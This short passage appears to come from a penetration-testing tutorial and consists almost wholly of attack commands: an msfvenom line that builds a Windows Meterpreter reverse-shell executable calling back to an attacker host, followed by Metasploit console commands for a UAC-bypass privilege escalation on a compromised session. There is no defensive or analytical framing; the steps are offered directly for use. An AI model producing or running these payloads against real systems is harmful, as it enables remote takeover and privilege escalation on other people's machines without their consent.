## Quick example: Generating a Windows Meterpreter Payload

A common approach is to use `windows/meterpreter/reverse_tcp` payload:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f exe -o shell.exe
```

This command generates an executable that, when run on the target system,  establishes a reverse connection to the attackerâ€™s machine.

## Bypassing UAC for Privilege Escalation

Once a foothold is gained, attempt to bypass User Account Control (UAC):

```
use exploit/windows/local/bypassuac
set SESSION <SESSION_ID>
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
```
